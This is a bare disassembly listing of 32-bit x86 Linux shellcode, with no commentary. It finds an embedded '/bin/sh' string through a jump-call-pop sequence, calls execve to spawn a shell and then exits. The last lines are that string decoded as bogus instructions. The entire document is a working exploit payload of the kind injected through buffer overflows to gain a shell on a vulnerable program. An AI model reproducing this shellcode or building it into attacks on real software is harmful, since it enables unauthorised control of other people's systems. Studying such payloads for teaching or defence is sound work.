00000000  EB1F              jmp short 0x21
00000002  5E                pop esi
00000003  897608            mov [esi+0x8],esi
00000006  31C0              xor eax,eax
00000008  884607            mov [esi+0x7],al
0000000B  89460C            mov [esi+0xc],eax
0000000E  B00B              mov al,0xb
00000010  89F3              mov ebx,esi
00000012  8D4E08            lea ecx,[esi+0x8]
00000015  8D560C            lea edx,[esi+0xc]
00000018  CD80              int 0x80
0000001A  31DB              xor ebx,ebx
0000001C  89D8              mov eax,ebx
0000001E  40                inc eax
0000001F  CD80              int 0x80
00000021  E8DCFFFFFF        call 0x2
00000026  2F                das
00000027  62696E            bound ebp,[ecx+0x6e]
0000002A  2F                das
0000002B  7368              jnc 0x95
